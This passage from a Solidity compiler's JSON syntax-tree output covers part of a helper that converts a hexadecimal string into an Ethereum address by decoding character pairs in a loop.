																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 906,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9016:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9010:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 908,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9009:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 911,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 909,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 827,
																						"src": "9024:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 910,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9030:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9024:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 912,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9023:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9009:24:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 919,
																	"nodeType": "IfStatement",
																	"src": "9005:73:3",
																	"trueBody": {
																		"id": 918,
																		"nodeType": "Block",
																		"src": "9035:43:3",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 916,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 914,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 827,
																						"src": "9054:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 915,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9060:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9054:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 917,
																				"nodeType": "ExpressionStatement",
																				"src": "9054:8:3"
																			}
																		]
																	}
																},
																"id": 920,
																"nodeType": "IfStatement",
																"src": "8926:152:3",
																"trueBody": {
																	"id": 904,
																	"nodeType": "Block",
																	"src": "8956:43:3",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 902,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 900,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 827,
																					"src": "8975:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 901,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8981:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "8975:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 903,
																			"nodeType": "ExpressionStatement",
																			"src": "8975:8:3"
																		}
																	]
																}
															},
															"id": 921,
															"nodeType": "IfStatement",
															"src": "8846:232:3",
															"trueBody": {
																"id": 890,
																"nodeType": "Block",
																"src": "8877:43:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 888,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 886,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 827,
																				"src": "8896:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 887,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8902:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "8896:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 889,
																		"nodeType": "ExpressionStatement",
																		"src": "8896:8:3"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 930,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 924,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 922,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 830,
																				"src": "9097:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 923,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9103:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9097:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 925,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9096:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 928,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 926,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 830,
																				"src": "9111:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 927,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9117:3:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9111:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 929,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9110:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9096:25:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 944,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 938,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 936,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 830,
																					"src": "9177:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 937,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9183:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9177:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 939,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9176:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 942,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 940,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 830,
																					"src": "9191:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 941,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9197:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9191:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 943,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9190:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9176:24:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 958,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 952,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 950,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 830,
																						"src": "9256:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 951,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9262:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9256:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 953,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9255:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 956,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 954,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 830,
																						"src": "9270:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 955,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9276:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9270:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 957,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9269:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9255:24:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 964,
																	"nodeType": "IfStatement",
																	"src": "9251:73:3",
																	"trueBody": {
																		"id": 963,
																		"nodeType": "Block",
																		"src": "9281:43:3",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 961,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 959,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 830,
																						"src": "9300:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 960,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9306:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9300:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 962,
																				"nodeType": "ExpressionStatement",
																				"src": "9300:8:3"
																			}
																		]
																	}
																},
																"id": 965,
																"nodeType": "IfStatement",
																"src": "9172:152:3",
																"trueBody": {
																	"id": 949,
																	"nodeType": "Block",
																	"src": "9202:43:3",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 947,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 945,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 830,
																					"src": "9221:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 946,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9227:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9221:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 948,
																			"nodeType": "ExpressionStatement",
																			"src": "9221:8:3"
																		}
																	]
																}
															},
															"id": 966,
															"nodeType": "IfStatement",
															"src": "9092:232:3",
															"trueBody": {
																"id": 935,
																"nodeType": "Block",
																"src": "9123:43:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 933,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 931,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 830,
																				"src": "9142:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 932,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9148:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9142:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 934,
																		"nodeType": "ExpressionStatement",
																		"src": "9142:8:3"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 974,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 967,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 823,
																	"src": "9338:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 972,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 970,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 968,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 827,
																					"src": "9348:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 969,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9353:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "9348:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 971,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 830,
																				"src": "9358:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "9348:12:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 973,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9347:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "9338:23:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 975,
															"nodeType": "ExpressionStatement",
															"src": "9338:23:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 842,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 836,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 833,
														"src": "8692:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 841,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 837,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8696:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 840,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 838,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8700:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 839,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8704:2:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "8700:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "8696:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "8692:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 977,
												"initializationExpression": {
													"assignments": [
														833
													],
													"declarations": [
														{
															"constant": false,
															"id": 833,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 977,
															"src": "8680:6:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 832,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "8680:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 835,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 834,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "8689:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "8680:10:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 845,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 843,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 833,
															"src": "8708:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 844,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8713:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "8708:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 846,
													"nodeType": "ExpressionStatement",
													"src": "8708:6:3"
												},
												"nodeType": "ForStatement",
												"src": "8675:698:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 980,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 823,
															"src": "9398:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 979,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9390:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
